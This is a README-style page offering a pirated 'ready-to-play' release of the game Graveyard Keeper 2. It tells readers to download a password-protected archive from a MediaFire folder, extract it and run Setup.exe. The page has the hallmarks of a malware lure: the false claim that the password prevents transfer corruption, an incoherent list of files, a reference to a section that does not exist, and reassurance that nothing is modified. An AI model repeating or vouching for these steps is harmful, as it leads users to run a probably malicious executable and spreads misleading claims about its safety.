## 🕹️ About

Graveyard Keeper 2 is a darkly comedic medieval simulation RPG developed by Lazy Bear Games and published by tinyBuild. As the Grand Inquisitor, you manage a graveyard, harvest resources, build machinery, automate production, and turn the town’s problems into profit. Rebuild the Town, complete quests, fortify defenses, and lead an undead army against a zombie apocalypse. Its mix of management, crafting, exploration, grotesque humor, and strategy creates an unusual and highly flexible sandbox. This ready-to-play release is packaged for quick setup: unpack, run, and play.

A strong fit for players who enjoy single-player management sims, crafting, automation, RPG progression, dark humor, and unconventional medieval adventures.

## ✨ Features

- 🗡️ **Dark Adventure** — Explore a twisted medieval world filled with quests, characters, and black humor.
- 🧟 **Undead Army** — Train and command zombies in battles against the undead threat.
- 🪦 **Graveyard Management** — Build and manage your own medieval graveyard for profit.
- ⚙️ **Production Automation** — Construct machinery and use zombie workers to automate production.
- 🏰 **Town Restoration** — Rebuild The Town and turn local problems into profitable opportunities.

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- localization.ini <- Language files
|-- audio.res <- Audio resources
|-- res.pak <- Resources archive
|-- lang.sys <- Language system
|-- patch_1.bnk <- Audio banks
|-- license.bank <- License data
|-- global.cfg <- Global settings
|-- installer.dat <- Installer data
|-- api.pak <- API modules
|-- animations.dll <- Animation system
|-- uninstall.key <- Uninstall key
|-- launcher.dll <- Launcher library
|-- assets.wem <- Asset audio
|-- settings.bin <- Configuration
|-- driver.umap <- Driver data
|-- dlc.md5 <- DLC checksums
|-- update_1.res <- Update resources
|-- physics.sys <- Physics engine
|-- scripts.lic <- Game scripts
|-- driver.pak <- Driver archive
|-- bootstrap.wem <- Bootstrap audio
|-- update_1.ini <- Update config
|-- Password 2026.txt <- Password reminder (empty)
|-- license.wem <- Audio assets
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play

## ❓ Frequently Asked Questions (FAQ)

**Q: What should I do if extraction fails?**
**A:** Make sure you're using a recent version of your extractor and that the archive wasn't corrupted during download. If it fails, re-download the archive.

**Q: Why is the archive password-protected?**
**A:** The password prevents the archive from being corrupted during transfer and keeps the files bundled correctly. The password is provided in the download section.

**Q: How often is the release updated?**
**A:** The package is rebuilt whenever the source files change. Check the Releases page for updates.

**Q: Is the game modified in any way?**
**A:** No. The game itself is exactly the same as the original release. Only the packaging and installation flow are streamlined.

**Q: What platforms are supported?**
**A:** The current focus is Windows. Other platforms are not part of the active roadmap at this time.

**Q: What are the system requirements?**
**A:** The release targets the same hardware as the original game. See the System Requirements section above.
